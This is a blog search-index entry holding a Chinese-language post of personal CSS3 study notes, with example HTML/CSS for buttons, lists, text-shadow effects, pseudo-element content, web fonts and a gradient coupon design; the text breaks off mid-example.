<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSS3开坑_不定期更新</title>
    <url>/2019/02/14/CSS3%E5%BC%80%E5%9D%91-%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<p>自己之前稍微开了一下html5的坑，换一个心情，记录一下自己从0学CSS3遇到的一些知识点</p>
<p>主要的学习资料就还是HTML5+CSS3从入门到精通以及一些网上的资料</p>
<p>里面一些图片可能有水印，是因为我没有云啦，就把图片直接弄在CSDN上然后复制过来了，偷个懒</p>
<span id="more"></span>

<h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><p>其实一开始我都没听说过这名词，后来发现就是指# .classname这些定义CSS的方法</p>
<p>就先罗列一下选择器的种类吧，遇到了慢慢学就好：</p>
<p>元素选择器；关系选择器；属性选择器；伪类选择器；伪对象选择器</p>
<h3 id="案例样式"><a href="#案例样式" class="headerlink" title="案例样式"></a>案例样式</h3><p>里面会涉及到不少选择器，效果我就不展示了，标一下注释给自己看看</p>
<h4 id="按钮样式"><a href="#按钮样式" class="headerlink" title="按钮样式"></a>按钮样式</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">ul</span>&#123;<span class="attribute">list-style</span>: none;&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-class">.button</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">display</span>: block;<span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">        <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">25px</span>; <span class="attribute">width</span>: <span class="number">120px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">18px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="css">        <span class="attribute">font</span>: <span class="number">12px</span> <span class="string">&#x27;Helvetica Neue&#x27;</span>,Helvetica,Arial;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="css">        <span class="attribute">line-height</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.gray</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>:<span class="number">#555</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">border-bottom</span>: <span class="number">4px</span> solid <span class="number">#b2b1b1</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background</span>: <span class="number">#eee</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.gray</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">background</span>: <span class="number">#e2e2e2</span>;&#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*设置元素在其鼠标悬停时的样式*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-class">.button</span>:before,a.button:after&#123;</span></span><br><span class="line"><span class="css">        content: <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">120px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">left</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">bottom</span>: -<span class="number">1px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">        <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*伪对象选择器*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-class">.button</span>:before&#123;</span></span><br><span class="line"><span class="css">        height: <span class="number">23px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">bottom</span>: -<span class="number">4px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">border-top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">border-radius</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">3px</span> <span class="number">3px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="number">0</span> <span class="number">#bfbfbf</span>;</span></span><br><span class="line"><span class="css">        <span class="comment">/*阴影*/</span></span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-class">.button</span>&#123;<span class="attribute">border-radius</span>: <span class="number">3px</span>;&#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*圆角*/</span></span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button gray&quot;</span>&gt;</span>灰色风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button pink&quot;</span>&gt;</span>粉红风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button blue&quot;</span>&gt;</span>蓝色风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button green&quot;</span>&gt;</span>绿色风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button turquoise&quot;</span>&gt;</span>天蓝色风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button black&quot;</span>&gt;</span>黑色风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button darkgray&quot;</span>&gt;</span>深灰色风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button yellow&quot;</span>&gt;</span>黄色风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button purple&quot;</span>&gt;</span>紫色风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button darkblue&quot;</span>&gt;</span>银灰色风格按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="列表样式"><a href="#列表样式" class="headerlink" title="列表样式"></a>列表样式</h4><p>这个样式蛮有意思的，我试着做一个手机上小说的目录，蛮有趣的，但遗憾的是找不到好的背景图，比如显示榜单排名热度的标识，本来是打算标识是有颜色的正好，现在就有点枯燥了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-id">#wrap</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">276px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">260px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#wrap</span> <span class="selector-tag">ul</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">list-style-type</span>: none;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: <span class="number">#777</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#wrap</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">line-height</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding</span>: <span class="number">1px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">28px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#wrap</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: <span class="number">#777</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#wrap</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">color</span>: <span class="number">#F63</span>;&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#wrap</span> <span class="selector-tag">li</span><span class="selector-pseudo">:first</span>-child&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">19px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: <span class="number">#81736c</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*第一个子元素*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-id">#wrap</span> <span class="selector-tag">li</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>)&#123;<span class="attribute">font-weight</span>: bold;&#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*第二个子元素*/</span></span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>双周热门推荐<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>呐喊<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>三体-死神永生<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>白菜鸡肉粉丝包<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>可爱的xiaoyuyu<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>南师虽去，精神永存<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>出师表<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>高等数学A<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>老九门<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>还有一些蛮有用的伪类比如:disabled;:enabled;:target;:checked都是挺实用的</p>
<h2 id="文本模块"><a href="#文本模块" class="headerlink" title="文本模块"></a>文本模块</h2><p>文字怎么书写其实挺细的，就先介绍一些我自己觉得比较常用的吧，反正也是给自己看的233，案例比较靠谱</p>
<h3 id="案例样式-1"><a href="#案例样式-1" class="headerlink" title="案例样式"></a>案例样式</h3><h4 id="火焰一般的特效字（text-shadow）"><a href="#火焰一般的特效字（text-shadow）" class="headerlink" title="火焰一般的特效字（text-shadow）"></a>火焰一般的特效字（text-shadow）</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span>&#123;<span class="attribute">background</span>: <span class="number">#000</span>;&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">        <span class="attribute">font</span>: bold <span class="number">60px</span> helvetica,Arial,sans-serif;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">4px</span> white,</span></span><br><span class="line"><span class="css">            <span class="number">0</span> -<span class="number">5px</span> <span class="number">4px</span> <span class="number">#ff3</span>,</span></span><br><span class="line"><span class="css">            -<span class="number">2px</span> -<span class="number">15px</span> <span class="number">11px</span> <span class="number">#fd3</span>,</span></span><br><span class="line"><span class="css">            <span class="number">2px</span> -<span class="number">25px</span> <span class="number">18px</span> <span class="number">#f20</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Text<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>HTML+CSS3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190216214221335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTkyNjcy,size_16,color_FFFFFF,t_70" alt="img"></p>
<h4 id="content与before和after的配合"><a href="#content与before和after的配合" class="headerlink" title="content与before和after的配合"></a>content与before和after的配合</h4><p>这个其实emmmm，我还想不出实际意义，可能所有有相同元素的模块都漏东西没加上，用这一招同意增加还是不错的，就不用麻烦js了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-attr">[href $=<span class="string">&quot;.pdf&quot;</span>]</span>:after&#123;content: <span class="built_in">url</span>(<span class="string">xiaoyuyu.jpg</span>)&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">a</span><span class="selector-attr">[rel = <span class="string">&quot;external&quot;</span>]</span>:after&#123;content: <span class="string">&quot;xiaoyuyu&quot;</span>&#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.book.com/1688.pdf&quot;</span>&gt;</span>HTML+CSS从入门到精通<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.book.com/1688/&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;external&quot;</span>&gt;</span>HTML+CSS从入门到精通<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>能插入的还蛮多的，string/attr/url，挺实用的</p>
<h4 id="网络字体-font-face"><a href="#网络字体-font-face" class="headerlink" title="网络字体@font-face"></a>网络字体@font-face</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-family</span>: <span class="string">&quot;lexograph&quot;</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">http://randsco.com/fonts/lexograph.eot</span>);</span></span><br><span class="line"><span class="css">        <span class="attribute">src</span>: <span class="built_in">local</span>(<span class="string">&quot;lexographer&quot;</span>),<span class="built_in">url</span>(<span class="string">http://randsco.com/fonts/lexograph.ttf</span>)<span class="built_in">format</span>(<span class="string">&quot;truetype&quot;</span>);</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">h1</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-family</span>: lexograph,Verdana,sans-serif;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">4em</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Font-face<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>https://woaixiaoyuyu.github.io/<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>有些时候会有问题，也很迷，但格式差不多就是这样，反正特殊字体，还是换成图片靠谱点，如果数量不多的话</p>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>主要就是背景图的操作，CSS3新增了不少</p>
<h3 id="案列样式"><a href="#案列样式" class="headerlink" title="案列样式"></a>案列样式</h3><h4 id="设计优惠券（径向渐变）"><a href="#设计优惠券（径向渐变）" class="headerlink" title="设计优惠券（径向渐变）"></a>设计优惠券（径向渐变）</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">387px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">140px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="css">        <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*before 设计底色*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span>:before&#123;</span></span><br><span class="line"><span class="css">        content: <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">        <span class="attribute">z-index</span>: -<span class="number">1</span>; <span class="comment">/* 让该层在文本层下面*/</span></span></span><br><span class="line"><span class="css">        <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">left</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">right</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*after 设计底色阴影*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span>:after&#123;</span></span><br><span class="line"><span class="css">        content: <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">        <span class="attribute">left</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">right</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.5</span>);</span></span><br><span class="line"><span class="css">        <span class="attribute">z-index</span>: -<span class="number">2</span>;  <span class="comment">/*最底部*/</span></span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*设计高亮面*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span> <span class="selector-tag">i</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">        <span class="attribute">left</span>: <span class="number">20%</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">top</span>: <span class="number">45px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">height</span>: <span class="number">190px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">390px</span>;</span></span><br><span class="line"><span class="css">        <span 